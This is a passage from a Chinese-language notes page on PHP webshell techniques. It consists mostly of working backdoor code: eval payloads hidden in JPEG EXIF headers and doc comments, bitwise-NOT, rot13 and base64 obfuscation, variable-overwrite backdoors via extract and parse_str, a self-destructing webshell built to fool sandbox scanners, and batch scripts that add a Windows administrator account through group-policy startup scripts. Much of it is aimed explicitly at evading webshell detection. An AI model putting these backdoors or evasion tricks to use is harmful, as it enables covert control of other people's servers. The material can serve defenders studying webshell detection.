    curl_setopt($ch, CURLOPT_FOLLOWLOCATION,true);  
    // 3. 执行并获取HTML文档内容  
    $output = curl_exec($ch);  
    // 4. 释放curl句柄  
    curl_close($ch);  
?>  
```

执行这个脚本后，会在apache的错误日志中留下原始的访问记录

\[Tue Jan 14 09:48:01.664731 2014] \[core:error] \[pid 9412:tid 1876] (20024)The given path is misformatted or contained invalid characters: \
\[client ::1:10248] AH00127: Cannot map GET /shell/ HTTP/1.1 to file

之后把log的地址当做参数传入即可，这里log位置须自行查找&#x20;

> http://localhost/shell/index.php?f=E:\wamp\logs\apache\_error.log

### 0x22: 利用字符的运算符来进行webshell的构造&#x20;

```php
<?php
    echo 'a'|'d';//e!  
?>
```

字符串和数字的强转:

```php
<?php  
    $_="abc";
    echo $_+1;  //1
?>

<?php  
    $_="1abc";
    echo $_+1;  //2
?>
```

字符串会被强制[转换](http://www.blogjava.net/zuofei-bie/archive/2010/03/31/317092.html)成数字，如果不能转，就返回0

```php
<?php  
    $_="abc";  
    echo ++$_;  //abd  
?>
# 这种"++"和"+"的表现形式还不太一样，"++"是把字符串最后一个字母进行"+1"
```

### 0x23: 使用PHP的管道技术执行系统命令后门&#x20;

[`open`](http://www.w3school.com.cn/php/func\_filesystem\_popen.asp)`()`

```php
<?php
    /*
        PHP中如何增加一个系统用户
        下面是一段例程，
        用户名: test
        密码是: 111
    */
    $command = "net user";
    $useradd = "add ";
    $pwd = "111";
    $user = "test";  
    $user_add = sprintf("%s "%s %s"", $command, $useradd, $user, $pwd);
    $fp = @popen($user_add,"w");  
    @pclose($fp);
?>


```

命令执行成功，添加账户成功。PHP执行命令有很多方法，`eval`、`passthru`、`system`、`assert`、`popen`、`exec`、`shell_exec`

### 0x24: 利用PHP的指令替换编写webshell&#x20;

```php
<?php   
    $cmd = `dir`;  
    echo $cmd;   
?>  
```

### 0x25: 利用一些CMS等开源框架进行本地变量覆盖&#x20;

```php
<?php
    foreach ($_GET as $key => $value)
    {
        $result .= "$key=$value&";
    }
    /*
        很多开源框架都有类似上面这段功能的代码，用于将用户输入的参数进行批量的本地化
        但是这也往往导致了"本地变量覆盖漏洞"
        同时也可以被黑客用来在原本正常的文件中插入
            parse_str($result);
            $sys($command);
        这段代码来进行getshell
    */
    ..
    parse_str($result);
    $sys($command);
?>
# http://localhost/shell/index.php?sys=system&command=dir
```

### 0x26：基于图片文件非可显示字段(例如图片头meta)部署PHP图片木马

和传统的把php代码type进图片不一样，这里介绍另一种图片木马的利用方式。

图片木马相关知识：

> http://en.wikipedia.org/wiki/Exchangeable\_image\_file\_format\
> http://blog.sucuri.net/2013/07/malware-hidden-inside-jpg-exif-headers.html

Malware Hidden Inside JPG EXIF Headers &#x20;

[exif\_read\_data](http://cn2.php.net/manual/zh/function.exif-read-data.php)

exif\_read\_data() 函数从 JPEG 或 TIFF 图像文件中读取 EXIF 头信息。这样就可以读取数码相机产生的元数据

```php
<?php
    echo "img.jpg:
\n";
    $exif = exif_read_data('img.jpg', 'IFD0');
    //IFD0     所有 IFD0 的标记数据。在标准的图像文件中这包含了图像大小及其它。
    echo $exif===false ? "No header data found.
" : "Image contains headers
";
    echo "
";

    //FILE    FileName, FileSize, FileDateTime, SectionsFound
    $exif = exif_read_data('img.jpg', 'FILE', true);
    echo "img.jpg:
\n";
    foreach ($exif as $key => $section)
    {
        foreach ($section as $name => $val)
        {
            echo "$key.$name: $val
\n";
        }
        echo "
";
    }
?>
```

这里提出了一种隐藏webshell的新思路

1. 和传统的图片木马不一样，传统的图片木马就是简单的利用type命令把webshell代码接在一个正常的图片尾部，然后在另一个脚本中使用include包含进来，PHP解析解析引擎会忽略在 PHP看来毫无意义的图片数据的乱码，而去执行在文件结尾的PHP代码，这是一种很好的利用方式
2. 而关于这种图片木马，可以有一种更加精确的利用方式，图片(也就是EXIT格式的文件)的每个区段都是有精确意义的，我们可以将我们的webshell准确地放置在这些指定的区域， 然后使用exif\_read\_data去读取读取出来，然后使用preg\_replace的"e"开关去动态执行，或者使用动态函数去动态执行
3. 这个可以用来规避include那种类型的黑名单检测&#x20;

将webshell代码放置在EXIT的头部区域中，这里挑选:\
&#x20;IFD0->&#x20;

1. ImageDescription: /.\*/e&#x20;
2. Subject: eval($\_POST\[1]) (注意这里要使用winhex来进行ASCII字符的修改)

```php
<?php  
    //FILE    FileName, FileSize, FileDateTime, SectionsFound
    $exif = exif_read_data('img.jpg', 'FILE', true);
    var_dump($exif['IFD0']['ImageDescription']);
    var_dump($exif['IFD0']['Subject']);
    preg_replace($exif['IFD0']['ImageDescription'], $exif['IFD0']['Subject'],'');
    //die();
?>
```

### 0x27: 将数据放在注释中并利用反射机制获取webshellcode

1

http://www.8090sec.com/suixinbiji/111568.html

黑客将webshell放到了/\*\*/注释中，然后利用类的反射机制获取到，进行动态函数的执行

PHP的反射类机制

[ReflectionClass](http://cn2.php.net/manual/zh/reflectionclass.construct.php)

[ReflectionClass::getDocComment](http://cn2.php.net/manual/zh/reflectionclass.getdoccomment.php) — 获取文档注释

这是最终的poc：

```php
<?php  
    /**   
    * eval($_POST[1]);
    */  
    class TestClass { }  
    $rc = new ReflectionClass('TestClass');  
    //获取当前文档的注释
    $comment = $rc->getDocComment();
    //die(var_dump($comment));

    $pos = strpos($comment,'eval');
    //die(var_dump($pos));  

    $eval=substr($comment,$pos,16);  
    //die($eval);
    eval($eval);
?>



```

更高级一点的用法，现有的webshell检测系统会基于文本特征进行匹配，为了对抗这个防御策略，原则上来说，黑客想要做的是将原本的webshell代码进行加花、换行、大小写变形，但是在一般情况下，PHP代码如果被变形了(例如换行)就无法正常执行了。但是在反射类利用姿势这个case下，代码的变形成为了可能&#x20;

黑客在注释中可以任意插入花指令、换行等字符来绕过现有的特征检测机制

```php
<?php
    /**
    * eva
    * l($_GE
    * T["c"]);
    * asse
    * rt
    */
    class TestClass { }
    $rc = new ReflectionClass('TestClass');
    $str = $rc->getDocComment();
    die(var_dump($str));
    $evf=substr($str,strpos($str,'e'),3);
    $evf=$evf.substr($str,strpos($str,'l'),6);
    $evf=$evf.substr($str,strpos($str,'T'),8);
    $fu=substr($str,strpos($str,'as'),4);
    $fu=$fu.substr($str,strpos($str,'r'),2);
    $fu($evf);
?> 
```

### 0x28：webshell多态技术: 自毁型webshell

{% code title="毁性WebShell" %}
```php
<?php
    /*
        现在的PHP的webshell的检测基本用的是对PHP执行引擎进行hook进行动态检测
        即我们构造出一个沙箱，让目标脚本在里面执行一次，然后对执行的结果进行判断
        而我们的沙箱在触发这个脚本执行的时候由于没有给定准确的参数"code"，就会导致毁灭性覆写"fwrite ($fp, $content)"的结果
        这样，沙箱的执行结果就是一个普通的文本"helloworld"

        然后，管理员再去查看这个文件的时候，看到的就只是一个"helloworld"了

        这个是很针对"PHP的动态沙箱检测"的绕过的

        反而利用了沙箱的机制，沙箱导致了文件的毁坏
    */

    //$url = $_SERVER['PHP_SELF'];
    //$filename = end(explode('/',$url));
    //die($filename);
    if($_REQUEST["code"]==pany)
    {
        echo str_rot13('riny($_CBFG[pzq]);');
        eval(str_rot13('riny($_CBFG[pzq]);'));
    }
    else
    {
        $url = $_SERVER['PHP_SELF'];
        $filename = end(explode('/',$url));
           
        $content = 'helloworld';
        $fp = fopen ("$filename","w");
        if (fwrite ($fp, $content))
        {
            fclose ($fp);
            die ("error");
        }
        else
        {
            fclose ($fp);
            die ("good");
        }
        exit;
    }
?>
```
{% endcode %}

### 0x29: [利用本地变量注册技术](https://blog.sucuri.net/2014/02/php-backdoors-hidden-with-clever-use-of-extract-function.html)&#x20;

利用[extract](http://www.php.net/manual/en/function.extract.php)函数将输入数据注册为本地变量，然后利用PHP的动态执行特性进行动态函数执行

```php
<?php
    @extract ($_REQUEST);
    @die($ctime($atime));
?>
# http://localhost/test/index.php?ctime=assert&atime=phpinfo()
```

### 0x30: 关于本地变量注册技术的利用姿势

PHP中有三种姿势可能导致本地变量注册，进而利用PHP的动态函数执行技巧进行WEBSHELL的构造

1. extract
2. parse\_str
3. foreach(..) { \$$key = $value; }

这三种在本文中都给出了相应例子&#x20;

### 0x31: 利用PHP的逻辑运算符进行WEBSHELL的编码&#x20;

1

http://worm.cc/PHP中使用按位取反函数创建后门.html

{% tabs %}
{% tab title="WEBSHELL代码" %}
```php
<?php
    $x = ~"žŒŒš‹";
    $y = ~"—–‘™×Ö";
    $x($y);
?>
```
{% endtab %}

{% tab title="生成原理" %}
```php
<?php
    echo ~"assert";
    echo ~"phpinfo()";
?>
# 注意这个文件一定要保存为ANSI格式
```
{% endtab %}
{% endtabs %}

![](https://firebasestorage.googleapis.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MC0hWgbNjaxH4i6ny5D%2Fuploads%2FXQAYdNYjMrRoz07ejkuf%2Ffile.png?alt=media)

然后在浏览器端选择西方ISO-8859-1

![](https://firebasestorage.googleapis.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MC0hWgbNjaxH4i6ny5D%2Fuploads%2FjqWYRDAnftdEMw6woFYo%2Ffile.png?alt=media)

这是一种利用数学运算符来进行WEBSHELL隐藏的一个思路，举一反三，还可以使用其他的数学运算符来进行相似的隐藏效果

### 0x32：利用PHP扩展隐藏后门WEBSHELL木马

这种情况需要黑客已经对目标服务器具有一定的控制权，可以修改目标服务器的php.ini并且可以上传扩展文件.so、.dll到指定目录下。这种扩展型的后门木马的效果非常好，对静态检测程序、和动态沙箱检测程序的bypass特性都有很好的表现。技术上说，这种利用PHP扩展隐藏后门的方法还有分为两种

1. 编写扩展程序，Hook某些核心的PHP函数的执行流，并通过检测网络流量中是否出现指定的关键字(例如攻击者可以指定pwd:作为命令的触发标识)来决定是启动后门程序，并执行指令
2. 编写扩展程序，生成一些新的函数(例如backdoor\_eval())，这样，黑客就可以在自己的WEBSHELL.PHP中调用这种函数，从而躲避静态检测程序的检测http://www.kissthink.com/archive/3482.html

### 0x33: [猥琐流PHP层层加密隐藏](http://blog.wangzhan.360.cn/?p=65)&#x20;

### 0x34: 利用非常规字符集来绕过"关键字检测正则"的防御(包括神盾加密在内的主流在线加密工具基本都采用变量/函数/类名混淆的方式实现隐藏)

> http://www.cnblogs.com/52cik/p/php-variable-character.html\
> http://www.cnblogs.com/52cik/p/php-phpdp-thinking.html\
> http://www.php.net/manual/zh/language.variables.basics.php\
> http://x95.org/decryption-phpdp-and-phpjm.html

这种基于字符集的bypass思路是一种很好的技巧，可以绕过很多基于"指定模式的正则匹配"的webshell检测软件

**1. 神盾加密解密方案**

```php
<?php
$str = file_get_contents("Code.php");

// 第一步 替换所有变量
// 正则 \$[a-zA-Z_\x7f-\xff][\w\x7f-\xff]*
preg_match_all('|\$[a-zA-Z_\x7f-\xff][\w\x7f-\xff]*|', $str, $params) or die('err 0.');
$params = array_unique($params[0]); // 去重复
$replace = array();
$i = 1;
foreach ($params as $v) {
    $replace[] = '$p' . $i;
    tolog($v . ' => $p' . $i); // 记录到日志
    $i++;
}
$str = str_replace($params, $replace, $str);


// 第二步 替换所有函数名
// 正则 function ([a-zA-Z_\x7f-\xff][\w\x7f-\xff]*)
preg_match_all('|function ([a-zA-Z_\x7f-\xff][\w\x7f-\xff]*)|', $str, $params) or die('err 0.');
$params = array_unique($params[1]); // 去重复
$replace = array();
$i = 1;
foreach ($params as $v) {
    $replace[] = 'fun' . $i;
    tolog($v . ' => fun' . $i); // 记录到日志
    $i++;
}
$str = str_replace($params, $replace, $str);

// 第三步 替换所有不可显示字符
function tohex($m) {
    $p = urlencode($m[0]); // 把所有不可见字符都转换为16进制、
    $p = str_replace('%', '\x', $p);
    $p = str_replace('+', ' ', $p); // urlencode 会吧 空格转换为 + 
    return $p;
}
$str = preg_replace_callback('|[\x00-\x08\x0e-\x1f\x7f-\xff]|s', "tohex", $str);

// 写到文件
file_put_contents("Code.decode.php", $str);

function tolog($str) {
    file_put_contents("replace_log.txt", $str . "\n", FILE_APPEND);
}
?>
```

**2.  找源码解密**

```php
<?php
$file = 'plugin.php';  //要破解的文件


$fp = fopen($file, 'r');
$str = fread($fp, filesize($file));
fclose($fp);

copy($file, '0_'.$file);

$n = 1;
while($n < 10){
    $code = strdecode($str);
    if($n == 1){
        $code = str_replace("__FILE__", "'0_$file'", $code);
    }
    
    $replace = '$decode'.$n.'=trim';
    if(strpos($code, 'eval(') > 0){
        $code = str_replace('eval(', $replace.'(', $code);
    }else{
        preg_match("/@\\$(.*)\(\\$(.*),(.*)\(/isU", $code, $res);
        $code = str_replace($res[3], "'$replace", $code);
    }
    
    $code = preg_replace('/\\$(.*)=false;(.*?)\(\);/', '', $code); //上一版本
    $code = preg_replace('/\|\|@\\$(.*?)\(\);/', '|| print("ok");', $code);
    
    $code = destr($code);
    $tmp_file = 'detmp'.$n.'.php';
    file_put_contents($tmp_file, $code);
    include($tmp_file);

    $val = 'decode'.$n;
    $str = $$val;
    
    unlink($tmp_file);
    
    if(strpos($str, ';?>') === 0){
        $decode = $str;
        break;
    }
    
    $str = "". $str;
    $n++;
}


$decode = preg_replace("/^(.*)exit\('Access Denied'\); /", "", $decode);
$del = strrchr($decode, 'unset');
$decode = str_replace($del, "\r\n?>", $decode);
file_put_contents($file.'.de.php' ,$decode);
unlink('0_'.$file);
echo 'done';

////////////
function val_replace($code, $val, $deval){
    $code = str_replace('$'.$val.',', '$'.$deval.',', $code);
    $code = str_replace('$'.$val.';', '$'.$deval.';', $code);
    $code = str_replace('$'.$val.'=', '$'.$deval.'=', $code);
    $code = str_replace('$'.$val.'(', '$'.$deval.'(', $code);
    $code = str_replace('$'.$val.')', '$'.$deval.')', $code);
    $code = str_replace('$'.$val.'.', '$'.$deval.'.', $code);
    $code = str_replace('$'.$val.'/', '$'.$deval.'/', $code);
    $code = str_replace('$'.$val.'>', '$'.$deval.'>', $code);
    $code = str_replace('$'.$val.'<', '$'.$deval.'<', $code);
    $code = str_replace('$'.$val.'^', '$'.$deval.'^', $code);
    $code = str_replace('$'.$val.'||', '$'.$deval.'||', $code);
    $code = str_replace('($'.$val.' ', '($'.$deval.' ', $code);
    return $code;
}

function fmt_code($code){
    global $vals,$funs;
    preg_match_all("/\\$[0-9a-zA-Z\[\]']+(,|;)/iesU", $code, $res);
    foreach($res[0] as $v){
        $val = str_replace(array('$',',',';'), '', $v);
        $deval = destr($val, 1);
        $vals[$val] = $deval;
        $code = val_replace($code, $val, $deval);
    }

    preg_match_all("/\\$[0-9a-zA-Z\[\]']+=/iesU", $code, $res);
    foreach($res[0] as $v){
        $val = str_replace(array('$','='), '', $v);
        $deval = destr($val, 1);
        $vals[$val] = $deval;
        $code = val_replace($code, $val, $deval);
    }

    preg_match_all("/function\s[0-9a-zA-Z\[\]]+\(/iesU", $code, $res);
    foreach($res[0] as $v){
        $val = str_replace(array('function ','('), '', $v);
        $deval = destr($val, 1);
        $funs[$val] = $deval;
        $code = str_replace('function '.$val.'(', 'function '.$deval.'(', $code);
        $code = str_replace('='.$val.'(', '='.$deval.'(', $code);
        $code = str_replace('return '.$val.'(', 'return '.$deval.'(', $code);
    }
    return $code;
}

function strdecode($str){
    $len = strlen($str);
    $newstr = '';
    for($i=0; $i<$len; $i++){
        $n = ord($str[$i]);
        $newstr .= decode($n);
    }
    return $newstr;
}

function decode($dec){
    if(($dec > 126 || $dec<32) && $dec<>13 && $dec<>10){
        return '['.$dec.']';
    }else{
        return chr($dec);
    }
}

function destr($str, $val=0){
    $k = 0;
    $num = '';
    $n = strlen($str);
    $code = '';
    for($i=0; $i<$n; $i++){
        if($str[$i] == '[' && ($str[$i+1]==1 || $str[$i+1]==2)){
            $k = 1;
        }elseif($str[$i] == ']' && $k==1){
            $num = intval($num);
            if($val==1){
                $num = 97 + fmod($num, 25);
            }
            $code .= chr($num);
            $k = 0;
            $num = null;
        }else{
            if($k == 1){
                $num .= $str[$i];
            }else{
                $code .= $str[$i];
            }
        }
    }
    return $code;
}
?> 
```

**Relevant Link:**

> http://www.cnblogs.com/52cik/p/php-phpdp-thinking.html\
> http://www.phpdp.org/\
> http://www.zhaoyuanma.com/phpencode.html

### 0x35: 利用ReflectionFunction[\[1\]](http://php.net/manual/zh/class.reflectionfunction.php)[\[2\]](http://php.net/manual/zh/reflectionfunction.invokeargs.php)反射进行动态函数执行&#x20;

```php
<?php
    $func = new ReflectionFunction("system");
    echo $func->invokeArgs(array("$_GET[c]"));
?>
```

### &#x20;0x36: 基于Winapi 函数FindFirstFile()导致的畸形文件名

```php
https://code.google.com/p/pasc2at/wiki/SimplifiedChinese
http://www.2cto.com/Article/201407/320879.html
可以利用下面的脚本来生成一个"畸形文件名"
<?php
    for ($j=0; $j<256; $j++) 
    {
        for ($i=0; $i<256; $i++) 
        {
            /*
            确保在当前目录下有一个"1.php"文件
            */
            $url = '1.p' . chr($j) . chr($i);
            $tmp = @file_get_contents($url);
            if (!empty($tmp)) 
            {
                echo "1.p" . chr($j) . chr($i) . "
";
            }
        }
    }
?>



```

result(得到的结果):&#x20;

1.p>< \
1.p>> \
1.p>P \
1.p>p \
1.pH< \
1.pH> \
1.pHP \
1.pHp \
1.ph< \
1.ph> \
1.phP \
1.php \
1.p< \
1.p<" \
1.p<. \
1.p<< \
1.p<>

对于这种利用方式，我们只能说这样得到的文件扩展名都是可以被windows正确解析的，存在从而来进行bypass那些过滤了文件扩展名的webshell检测机制，但是要真正地利用它发动攻击，我觉得还有很多限制&#x20;

1. 这个issue只能在windows上才存在
2. 但是windows的文件系统明确禁止了一些特殊字符作为文件名
   1. <&#x20;
   2. &#x20;\>&#x20;
   3. &#x20;.(虽然没有禁止，但是会被windows自动删除)&#x20;
   4. &#x20;\*&#x20;
3. 3\. 所以理论上我们根本没办法在磁盘上写入这样的畸形后缀的文件，bypass也就无从谈起

### 0x37：webshell中的不死僵尸&#x20;

利用系统保留文件名创建无法删除的webshell

Windows 下不能够以下面这些字样来命名文件/文件夹：

1. aux
2. prn
3. con
4. nul
5. com1
6. com2
7. com3
8. com4&#x20;
9. &#x20;com5&#x20;
10. &#x20;com6
11. com7&#x20;
12. &#x20;com8&#x20;
13. &#x20;com9&#x20;
14. &#x20;lpt1&#x20;
15. lpt2&#x20;
16. &#x20;lpt3&#x20;
17. &#x20;lpt4
18. lpt5
19. lpt6
20. lpt7&#x20;
21. &#x20;pt8&#x20;
22. &#x20;lpt9

但是通过cmd的copy命令即可实现&#x20;

```php
D:\wwwroot>copy rootkit.asp \.\D:\wwwroot\lpt6.shell.asp 
```

注意: 前面必须有"\\.\\"&#x20;

这类文件无法在图形界面删除，只能在命令行下删除：&#x20;

```php
D:\wwwroot>del \.\D:\wwwroot\lpt6.shell.asp 
```

然而在IIS中，这种文件又是可以解析成功的。Webshell中的 "不死僵尸" 原理就在这

### 0x38: 利用组策略的自动执行脚本隐藏webshell&#x20;

1

准备开关机脚本 &#x20;

{% tabs %}
{% tab title="关机.bat" %}
```
@echo off
net user hxhack 123456/add
net localgroup administrators hxhack/add
```
{% endtab %}

{% tab title="启动.bat" %}
```
@echo off
net user hxhack/del
```
{% endtab %}
{% endtabs %}

启用开关机脚本

1. 点击"开始"菜单-运行"，输入命令"gpedit.msc"，回车后打开组策略编辑器程序窗口&#x20;
2. 依次展开"计算机配置"-"windows设置"-"脚本(启动/关机)"项目&#x20;
3. 双击右侧的"启动"。打开启动脚本设置对话框。点击"显示文件"按钮，将会自动打开系统启动脚本目录&#x20;
4. 将刚才建立的"启动.bat"移动到此文件夹中。然后关闭文件夹窗口。在启动脚本对话框中。点击"添加"按钮，浏览指定当前目录下的开机脚本文件"启动.bat"。
5. 点击确定按钮。完成添加。再点击"应用"按钮，使用当前启动设置。关闭启动脚本设置对话框。然后双击组策略编辑器中的"关机"项目，打开关机脚本设置对话框，用同样的方法添加关机脚本为"关机.bat"。最后关闭组策略编辑器

待研究：

> https://github.com/tennc/webshell\
> https://github.com/JohnTroony/php-webshells

### 0x39: 利用PHP自定义函数回调执行webshell

[`call_user_func()`](http://php.net/manual/zh/function.call-user-func.php)

```php
<?php
    if(key($_GET)=='dede')
        //call_user_func($_GET['dede'], "@eval($_POST[bs]);");
        call_user_func($_GET['dede'], base64_decode('QGV2YWwoJF9QT1NUW2JzXSk7'));
?>

<?php 
    //call_user_func($_GET['dede'], "@eval($_POST[bs]);");
    call_user_func($_GET['dede'], base64_decode('QGV2YWwoJF9QT1NUW2JzXSk7')); 
?>
# http://localhost/test/test.php?dede=assert
```

### 0x40: 利用PHP扩展定界标签实现正则检测绕过

PHP是一种和HTML混编的脚本语言，它允许的定界标签如下

1. 'if you want to serve XHTML or XML documents, do it like this'; ?>//永远可用
2. &#x20;'if you want to serve XHTML or XML documents, do it like this';//PHP允许半闭合
3. //永远可用
4. //单引号
5. //无引号
